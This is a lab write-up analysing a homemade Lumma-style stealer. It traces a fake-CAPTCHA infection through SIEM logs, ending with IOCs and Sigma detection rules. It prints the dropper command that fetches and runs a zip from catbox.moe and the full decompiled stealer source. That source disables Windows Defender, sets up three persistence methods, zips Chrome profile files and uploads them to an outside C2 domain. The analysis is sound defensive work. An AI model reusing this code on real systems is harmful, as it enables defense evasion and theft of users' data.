---
title: "Homemade_Lumma Stealer"
date: 2025-02-21 09:52:24 +0300
categories: []
tags: [Writeup]
description: WE Innovate Lumma stealer lab analysis.

image:
  path: /assets/images/posts/2025-02-21-Homemade_Lumma Stealer/00.png
---


## Report Summary

### Timeline:
1.  `2025-02-17T15:47:38.759Z`: Initial access through fake reCAPTCHA phishing.
2.  `2025-02-17T15:49:22.592Z`: Multiple commands ran to disable Windows Defender as a defense evasion until `2025-02-17T15:49:59.705Z`.
3.  `2025-02-17T15:50:09.984Z`: A scheduled task was created as part of persistence, along with two other persistence techniques.
4.  `2025-02-17T13:50:19.578Z`: The collected files from the victim's machine were exfiltrated to the C2.

### IOCs

#### Hash
- **LummaC2 Sample SHA-256**:  
  `2a90c14a30e0f54824c26cf3d50688a217ef476c2cdd4f402c5762e4cae61022`

#### C2 Domains
- **LummaC2 Domain**:  
  `callosallsaospz[.]shop`

### Key Findings

1. The attacker's claims about stealing the victim's passwords and banking information have been proven false. More details can be found in [Harvesting](#harvesting).
2. Based on OSINT, the attacker is believed to be a script kiddie from **Assiut, Egypt**.


### Index:
1. [Initial access](#initial-access)
2. [Malware Analysis](#malware-analysis)
3. [Defence Evasion](#defence-evasion)
4. [Persistence](#persistence)
5. [Harvesting](#harvesting)
6. [Exfiltration](#exfiltration)
7. [OSINT](#osint)
8. [More about Lumma stealer & Detection](#more-about-lumma-stealer--detection)



## Scenario

You got this email from your SOC Manager:
```
Greetings my dear investigator,  
We need your assistance in an urgent case... It might sound weird, but hear me out.  
Okay, so basically our CTO was watching a football match between Juventus and PSV. Soooo... what happened is that he got a  
pop-ad telling him to access this site where he will win Samuel Mbangula SIGNED SHIRT WHO SCORED THE WINNING GOAL!!!!  
Exciting isn't it?!  
Anyways, the ad was fake and they lied to him! Can you believe that? THIS IS WHY IT'S WEIRD, WHY WOULD THEY LIE TO HIM  
ABOUT THAT! Whatever. they made him do some sort of CAPTCHA I think?  
Anyway, I want you to investigate in this case and document your findings.  
Our SIEM triggered an alert of the following I don't remember really:  
1.Defense Evasion I think?
2.Persistence.
These alerts were fired i guess at 2/17/2025 3:00 something cairo time  
This is only what we have on this case, we didn't hire detection engineers to create more detection rules so work with what  
you have.  
Also, the URL had something related to "cat" in it, but I don't remember really. Go and check out this link and its functionalities  
or something.  
FYI, I've tried figuring out what this malware does, but no luck. I even opened it up on my main machine and just a blank CMD  
popped up. It seems like the malware is not working so make sure if it's a false positive or not.  
One more thing! There was a text file in the folder named: "don't read me please, I will hack you if u open this text.txt"  
I didn't open it because, well, it might actually be malicious. Just a heads-up, so please don't open that file either.  
Best Regards,  
Your SOC Manager.
```

## Initial access

And we gained access to an Elasticsearch instance to work with. I know that the incident occurred on **02/17/2025** and check the alerts from that time as a starting point.

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/01.png)01.png]]
So, we have a single machine (the victim's machine) and three different types of alerts. There are still too many alerts to work with, so I will try to narrow them down. I will filter for only **"Process Execution from an Unusual Directory"** since that should provide a good lead to start with.

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/02.png)02.png]]

We can see that four alerts occurred around 11 o’clock and another four around 15 o’clock. Since the manager mentioned that the incident happened at **"2/17/2025 3:00 something Cairo time,"** I will narrow the timespan I examine to start from 15 o’clock. Additionally, we need to be aware that the alert timestamps are in Cairo time.

Six of the alerts are related to a process named `exec.exe`, and the first alert for that process occurred before the timeframe we are currently focusing on. Therefore, I will ignore them for now, as they are not a top priority.

Inspecting the alert related to `pretty_normal_file_x64.exe`, we see this:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/03.png)03.png]]


The executable named `pretty_normal_file_x64.exe` ran from the user `Public` desktop, which is indeed an unusual directory. I will try to create a timeline, so it is important to document the timestamp of each action. The alert was triggered at `2025-02-17T15:52:08.768Z`, and from the JSON tab, there is a field called `event.created`, which indicates that the actual process execution event was created at `2025-02-17T15:49:20.928Z`. The timestamps in the JSON tab are in UTC, but I will stick with Cairo time.

But how did this executable reach the machine in the first place? I will look for events where this executable appears. To do so, I will create a new `visualization`, set it to be `aggregation-based`, and choose `Data table`. I will start by identifying which log files contain this executable using the `Split row` option:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/04.png)04.png]]

This should be our reference when we want to look into specific events. I couldn't confirm it 100%, but `system.security` and `winlog.winlog` appear to be identical, so I will use `system.security` only.
Now, I want to see which log files contain `pretty_normal_file_x64.exe`:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/05.png)05.png]]

I will look into `windows.powershell_operational` in `Discover`, and here is what I found:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/06.png)06.png]]
I toggled the field `powershell.file.script_block_text` to appear as a column. We found a single value for the executed script:
```powershell
$uR = 'https://files.catbox.moe/edhauf.zip'; $dL = 'C:\Users\Public\Desktop\I am Arthur Morgan.zip'; Invoke-WebRequest -Uri $uR -OutFile $dL -UseBasicParsing; $extractPath = 'C:\Users\Public\Desktop\A legitimate software'; Expand-Archive -Path $dL -DestinationPath $extractPath -Force; Start-Process -FilePath 'C:\Users\Public\Desktop\A legitimate software\pretty_normal_file_x64.exe';
```
What this script essentially does is download `edhauf.zip` from a specific link to `C:\Users\Public\Desktop\I am Arthur Morgan.zip`, extract it into a folder named `A legitimate software`, and then execute `pretty_normal_file_x64.exe`. This script was executed at `2025-02-17T15:47:38.759Z`.

I want to save the process ID (PID) of the executable, which can be obtained from `system.security`, as it logs process creation events. I will filter for `event.code is 4688` and use the result later.

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/11.png)11.png]]

But again, how did this script reach the machine to execute? While researching phishing techniques, I found this article about [fake CAPTCHA](https://denwp.com/anatomy-of-a-lumma-stealer/) (along with this [PoC](https://github.com/JohnHammond/recaptcha-phish)), which describes a method that tricks users into opening the Windows Run dialog box using the `Win+R` hotkey. The victim is then instructed to paste a malicious command using `Ctrl+V`, which the web browser has preemptively copied into their clipboard.

Now, we have identified our `Initial Access` technique as [Phishing (T1566)](https://attack.mitre.org/techniques/T1566/).
## Malware Analysis

From here, I could continue analyzing the alerts, but I will first gather more information about the downloaded executable. The link above is still working, so I will obtain this malware sample for analysis.

After extracting `edhauf.zip`, I found `pretty_normal_file_x64.exe` and a text file named `don't read me please, I will hack you if u open this text.txt`. I checked for any Alternate Data Streams (ADS) in the text file, but there were none—just regular text:
```
So, you've opened the text document. Okay fella.

What is happening right now, that your data are getting stolen by me Arthur Morgan. Yes, the ARTHUR MORGAN! You might say Arthur Morgan is an honorable man and won't steal from an elder man.
Well, You are wrong because I stole from you and there's nothing you can do lol. Okay, so the thing is I may have not stolen every thing you get me?
Of course you don't, you are an old man... I think, LIKE WHO WATCHES JUVENTUS BRO? Anyways, I'm assuming that you are pretty old and have a bad memory like a dumdum so I think you likely are using Chrome and you are likely saving your password and YOUR BANKING INFORMATION, YES!
You might think, if you are aware of the cyber world you old man that why haven't I encrypted all of your files and made you pay a ransom? You might say because I'M THE ARTHUR MORGAN so I'll be honorable and won't do that... But you are wrong Mister, sadly I- I don't know how to encrypt files 😭😭. DON'T LAUGH!

Anyways, if one day if you know someone who can help me encrypt data make them DM me on X

@Za_Real_Arthur
```

We will get to that note later. I want to know more the executable so I will start with [DIE](https://github.com/horsicq/DIE-engine/releases)

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/08.png)08.png]]

So, the executable is packed with `PyInstaller`. I will attempt to extract the bytecode and then decompile it:

```bash
$ pyinstxtractor pretty_normal_file_x64.exe
[+] Processing pretty_normal_file_x64.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.13
[+] Length of package: 7674645 bytes
[+] Found 60 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: script.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.13 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: pretty_normal_file_x64.exe

You can now use a python decompiler on the pyc files within the extracted directory

$ pycdc pretty_normal_file_x64.exe_extracted/script.pyc
Bad MAGIC!
Could not load file pretty_normal_file_x64.exe_extracted/script.pyc
```

We extracted the bytecode but couldn't decompile it successfully, so I will use an online decompiler instead:

```
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: script.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)
import os
import time
import shutil
import zipfile
import subprocess
import winreg
EXE_PATH = 'C:\\Users\\Public\\Desktop\\A legitimate software\\pretty_normal_file_x64.exe'
ZIP_PATH = os.path.join(os.getenv('TEMP'), 'Micah.zip')
C2_SERVER = 'http://callosallsaospz.shop/upload'
EXFIL_SCRIPT_PATH = os.path.join(os.getenv('TEMP'), 'Not a real script.ps1')
def disable_defender():
    """Disables Windows Defender protections."""
    try:
        commands = ['Set-MpPreference -DisableRealtimeMonitoring $true', 'Set-MpPreference -DisableBehaviorMonitoring $true', 'Set-MpPreference -DisableBlockAtFirstSeen $true', 'Set-MpPreference -DisableIOAVProtection $true', 'Set-MpPreference -DisablePrivacyMode $true', 'Set-MpPreference -MAPSReporting 0', 'Set-MpPreference -SubmitSamplesConsent 2', 'Set-MpPreference -DisableIntrusionPreventionSystem $true', 'Set-MpPreference -DisableScriptScanning $true']
        for cmd in commands:
            subprocess.run(['powershell', '-Command', cmd], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
        subprocess.run(['powershell', 'echo Does this go to Tahiti?'], check=True)
    except:
        return None
def establish_persistence():
    key = winreg.HKEY_CURRENT_USER
    reg_path = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg:
        winreg.SetValueEx(reg, 'WindowsUpdate', 0, winreg.REG_SZ, EXE_PATH)
    time.sleep(3)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    startup_path = os.path.join(startup_folder, 'winupdate.exe')
    shutil.copy(EXE_PATH, startup_path)
    time.sleep(3)
    task_command = f'schtasks /create /tn "what_a_rat" /tr "{EXE_PATH}" /sc onlogon /rl highest /f'
    subprocess.run(task_command, shell=True)
def zip_browser_data():
    user_profile = os.path.expanduser('~')
    chrome_path = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
    files_to_zip = []
    for root, _, files in os.walk(chrome_path):
        for file in files:
            if not file.endswith('.json') and (not file.endswith('.log')):
                continue
            files_to_zip.append(os.path.join(root, file))
    with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in files_to_zip:
            zipf.write(file, os.path.relpath(file, chrome_path))
    time.sleep(5)
    return True
def exfiltrate():
    powershell_command = f'\n    $filePath = "{ZIP_PATH}";\n    $url = "{C2_SERVER}";\n    $wc = New-Object System.Net.WebClient;\n    $wc.UploadFile($url, $filePath);\n    '
    time.sleep(3)
    subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', powershell_command], shell=True)
    subprocess.run(['powershell', "echo Oh, Dutch... He's a rat"], check=True)
disable_defender()
establish_persistence()
if zip_browser_data():
    exfiltrate()
```

Lucky for us ARTHUR don't like spaghetti and wrote a clean code. There are four functions corresponding to four stages of the attack, which we will go through one by one.

Here is the [report](https://www.hybrid-analysis.com/sample/2a90c14a30e0f54824c26cf3d50688a217ef476c2cdd4f402c5762e4cae61022/67b5c03403f48def080c0f91) for dynamic analysis on `hybrid-analysis.com`. What I find odd about that report is there is no network activity nor the zip file created, that is a good reason to not rely completely on automated dynamic malware analysis. 

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/09.png)09.png]]

Another [report](https://app.any.run/tasks/6aba0ec8-3c36-4cd9-8355-ceb0b1c6cfe8) from `any.run`. Note that there is no created zip files nor dns requests made to the malicious domain

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/10.png)10.png]]

## Defence Evasion 

We have this function:
```
def disable_defender():
    """Disables Windows Defender protections."""
    try:
        commands = ['Set-MpPreference -DisableRealtimeMonitoring $true', 'Set-MpPreference -DisableBehaviorMonitoring $true', 'Set-MpPreference -DisableBlockAtFirstSeen $true', 'Set-MpPreference -DisableIOAVProtection $true', 'Set-MpPreference -DisablePrivacyMode $true', 'Set-MpPreference -MAPSReporting 0', 'Set-MpPreference -SubmitSamplesConsent 2', 'Set-MpPreference -DisableIntrusionPreventionSystem $true', 'Set-MpPreference -DisableScriptScanning $true']
        for cmd in commands:
            subprocess.run(['powershell', '-Command', cmd], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
        subprocess.run(['powershell', 'echo Does this go to Tahiti?'], check=True)
    except:
        return None
```

It carry a list of commands and these PowerShell commands weaken Windows Defender's security features, likely to evade detection for malicious activities such as malware execution. Here is a breakdown of what they do:

| **Command**                                                | **Effect**                                                                                                                                                  |
| ---------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Set-MpPreference -DisableRealtimeMonitoring $true`        | **Disables real-time protection**, allowing malware to run without immediate detection.                                                                     |
| `Set-MpPreference -DisableBehaviorMonitoring $true`        | **Disables behavior-based detection**, preventing Defender from detecting suspicious actions.                                                               |
| `Set-MpPreference -DisableBlockAtFirstSeen $true`          | **Disables first-time-seen file scanning**, preventing Defender from blocking new malware samples.                                                          |
| `Set-MpPreference -DisableIOAVProtection $true`            | **Disables scanning of files downloaded from the internet**, making it easier to run malicious payloads.                                                    |
| `Set-MpPreference -DisablePrivacyMode $true`               | **Allows Defender to show full threat details**, useful for attackers debugging Defender responses.                                                         |
| `Set-MpPreference -MAPSReporting 0`                        | **Disables cloud-based protection (Microsoft Advanced Protection Service - MAPS)**, stopping Defender from checking with Microsoft for threat intelligence. |
| `Set-MpPreference -SubmitSamplesConsent 2`                 | **Prevents Defender from submitting malware samples to Microsoft**, helping attackers avoid detection.                                                      |
| `Set-MpPreference -DisableIntrusionPreventionSystem $true` | **Disables network-based attack prevention**, making the system more vulnerable.                                                                            |
| `Set-MpPreference -DisableScriptScanning $true`            | **Disables script-based malware detection**, allowing malicious PowerShell or JavaScript to execute freely.                                                 |
Previously we got `pretty_normal_file_x64.exe` PID and it is `6920` we will use it to see child process for it. 
![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/12.png)12.png]]

It spawned itself again. I will retrieve the child process ID (PID) and filter using it. The PID for the child process is `1640`, and filtering with it gives:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/13.png)

We have our 9 commands that were used to disable the Windows Defender and more. The timestamp for those actions is `2025-02-17T15:49:22.592Z` to `2025-02-17T15:49:59.705Z`. Also the `Does this go to Tahiti` was executed. This behaviour corresponds to [Impair Defenses: Disable or Modify Tools (T1562.001)](https://attack.mitre.org/techniques/T1562/001/).
## Persistence

We have this function:
```
def establish_persistence():
    key = winreg.HKEY_CURRENT_USER
    reg_path = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg:
        winreg.SetValueEx(reg, 'WindowsUpdate', 0, winreg.REG_SZ, EXE_PATH)
    time.sleep(3)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    startup_path = os.path.join(startup_folder, 'winupdate.exe')
    shutil.copy(EXE_PATH, startup_path)
    time.sleep(3)
    task_command = f'schtasks /create /tn "what_a_rat" /tr "{EXE_PATH}" /sc onlogon /rl highest /f'
    subprocess.run(task_command, shell=True)
```

From the code we know that `EXE_PATH = 'C:\\Users\\Public\\Desktop\\A legitimate software\\pretty_normal_file_x64.exe'`. The function does the following:
1. Opens the Windows Run key and adds an entry named `r` that runs `EXE_PATH` whenever the user logs in.
2. It copies `EXE_PATH` to the windows start-up folder as any executable in this folder is automatically executed when the user logs in. It renames the executable to `winupdate.exe`.
3. It creates a scheduled task called `what_a_rat` that runs `EXE_PATH` at user logon with the highest privileges.

So, the attacker used three methods for persistence. We can't confirm the method that involved modifying the registry key since Windows channels, by default, don't log that unless tools like `Sysmon` are used.
For the Startup folder, I searched for `winupdate.exe`, and here’s what we found, which proves the existence of a successful command:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/14.png)

For the scheduled task that was done at `2025-02-17T15:50:09.984Z` and here what we can get from the logs:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/15.png)

The techniques that was used for persistence are [Boot or Logon Autostart Execution(T1547.001)](https://attack.mitre.org/techniques/T1547/001/) and [Scheduled Task(T1053.005)](https://attack.mitre.org/techniques/T1053/005/)
r
## Harvesting

We have this function:
```
def zip_browser_data():
    user_profile = os.path.expanduser('~')
    chrome_path = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
    files_to_zip = []
    for root, _, files in os.walk(chrome_path):
        for file in files:
            if not file.endswith('.json') and (not file.endswith('.log')):
                continue
            files_to_zip.append(os.path.join(root, file))
    with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in files_to_zip:
            zipf.write(file, os.path.relpath(file, chrome_path))
    time.sleep(5)
    return True
```

So, what this function essentially does is collect any `.log` or `.json` files from `\AppData\Local\Google\Chrome\User Data\Default` belonging to the user running the executable.

The attacker claimed in the note that they stole saved passwords and banking information from Chrome's AppData, but we proved this claim to be false. In Chromium-based browsers, credentials are stored in an SQLite database at `C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data`. However, passwords in this database are encrypted using a key stored in a file named `Local State` within `User Data`. And anyway the attacker didn't steal any of those files.
In newer versions of Chrome (such as our victim's version `133.0.6943.60`), the key in `Local State` is further encrypted using the Windows Data Protection API (DPAPI), making key extraction another challenge. Given these security measures, it is safe to assume that the attacker's claim is false. Here's a quick article about [stealing Chrome passwords](https://palmenas.medium.com/forensic-recovery-of-chrome-based-browser-passwords-e8df90d4a3cd).

I did some research on what could potentially be collected by running this script, and most of the retrieved files appear to be related to Chrome extensions. Files like `manifest.json` contain details about the extension, including permissions and background scripts. `computed_hashes.json` stores hashes of extension files to verify their integrity, while `verified_contents.json` carries verification data for Chrome’s security checks. Additionally, `managed_storage.json` may contain data related to settings stored by extensions, which could include synced preferences or security settings.

The attacker may be looking for vulnerabilities in extensions that could be exploited. While I couldn't map this behavior to a specific technique, it should fall under [Credential Access](https://attack.mitre.org/tactics/TA0006/).

The collected files were stored in a single zip file named `Micah.zip` in the `TEMP` folder. Although we can't confirm the exact timestamp of its creation, it should be around the time the process was executed.
## Exfiltration

We have this function:
```
def exfiltrate():
    powershell_command = f'\n    $filePath = "{ZIP_PATH}";\n    $url = "{C2_SERVER}";\n    $wc = New-Object System.Net.WebClient;\n    $wc.UploadFile($url, $filePath);\n    '
    time.sleep(3)
    subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', powershell_command], shell=True)
    subprocess.run(['powershell', "echo Oh, Dutch... He's a rat"], check=True)
```

So what does this code do is uploading the zip file to the C2 server at `http://callosallsaospz.shop/upload`. Going through the logs we get this:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/16.png)

So the exfiltration was done at `2025-02-17T13:50:19.578Z`
## OSINT

### callosallsaospz.shop
We had this domain ``http://callosallsaospz.shop/upload`` that in exfiltration phase the zip file was sent to it. Searching for threat intel related to that domain we get this from `virustotal`:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/17.png)

And from `x.com` I found this tweet:
![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/18.png)
So indeed this is a LummaC2 domain and our victim got his data stolen to this domain.

### @Za_Real_Arthur

From the downloaded zip `edhauf.zip` we extracted a note called `don't read me please, I will hack you if u open this text.txt` and it mentioned that the attacker name is `Aruthor Morgen` and provided its username on `x.com` [@Za_Real_Arthur](https://x.com/Za_Real_Arthur). Going through his profile has has a couple of tweets about the Juventus VS PSV match which is the same match used in the phishing. Also there is this tweet:

![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/19.png)

The attacker mentioned in the note he don't know about encryption and he wished he could make the victim pay ransom. Also we proved his claims about stealing the victim Passwords and Banking information to be wrong. All of that indicates he is a script kiddie, a script kiddie from `Assuit,Egypt`. 
## More about Lumma stealer & Detection

Lumma Stealer is designed to exfiltrate sensitive information such as passwords, session tokens, cryptocurrency wallets, and other personal data from infected machines. What makes this attack particularly dangerous is its deceptive delivery method, which exploits users' trust in CAPTCHA pages and employs social engineering tactics.

Lumma Stealer has been operating as a sophisticated malware-as-a-service (MaaS) since at least August 2022. It is being sold on Telegram and a dedicated website. Written in C, Lumma Stealer targets a wide range of data, including personal and financial information, as well as application-related data. It injects malicious code into legitimate Windows processes to steal and exfiltrate data. Additionally, it communicates with command-and-control (C2) servers, receiving updates and instructions while exfiltrating stolen data over encrypted channels.

Lumma Stealer specifically targets cryptocurrency wallets, extracting private keys, wallet addresses, and transaction histories. It also collects information from web browsers, including cookies, browsing history, extensions, login credentials, session data, and cache. The malware scans compromised systems for files containing specific keywords such as `seed.txt`, `pass.txt`, `ledger.txt`, `trezor.txt`, `metamask.txt`, `bitcoin.txt`, `words`, `wallet.txt`, `.txt`, and `*.pdf`. Furthermore, it retrieves data from email clients, potentially compromising email account credentials, messages, and attachments. It also searches for sensitive files within user directories, aiming to exfiltrate personal and financial data.

I found two `Sigma` rules that could detect communication with the `LummaC2` server based on proxy logs:

```yaml
title: Lumma Stealer C2 Behavior
id: 99a00f52-0a98-4673-95f7-9b4fbf6463a9
description: Searches for common communication patterns with suspiscious tlds associated with Lumma Stealer
status: experimental
author: NTT Security - Leandro Ferreira
date: 2024/09/25
modified: 2024/09/30
references:
  - https://medium.com/@Cyfirma_/lumma-stealer-tactics-impact-and-defense-strategies-6f44a682742f
  - https://threatfox.abuse.ch/browse/malware/win.lumma/
  - https://github.com/SamuraiMDR/sigma-rules/blob/main/rules/proxy/lumma_stealer.yml
logsource:
    category: proxy
detection:
    selection:
      cs-method: POST
      c-uri: '/api'
      cs-referer: ""
      cs-host|endswith:
        - .fun
        - .shop
        - .pw
        - .xyz
        - .store
        - .site
    condition: selection
falsepositives:
  - No known cases of false positives
level: high
tags:
  - attack.command_and_control
```


```yaml
title: Lumma Stealer C2 Traffic
id: fc9583b5-06c0-411f-aca7-982917801a7b
description: Detects Lumma stealer exfiltration traffic
status: experimental
author: NTT Security - Amata Anantaprayoon
date: 2023/06/20
modified: 2023/08/15
references:
  - https://malpedia.caad.fkie.fraunhofer.de/details/win.lumma
  - https://app.any.run/tasks/c1c2695d-b0b0-464f-a4e3-71b017d9ff9b/
logsource:
    category: proxy
detection:
    selection:
      cs-method: POST
      c-uri:
        - '/c2sock'
        - '/c2conf'
      cs-referer: ""
    condition: selection
falsepositives:
  - Legit urls matching the same pattern
truepositives:
  - Multiple HTTP 'POST /c2sock' after 'POST /c2conf'
level: high
tags:
  - attack.command_and_control
```


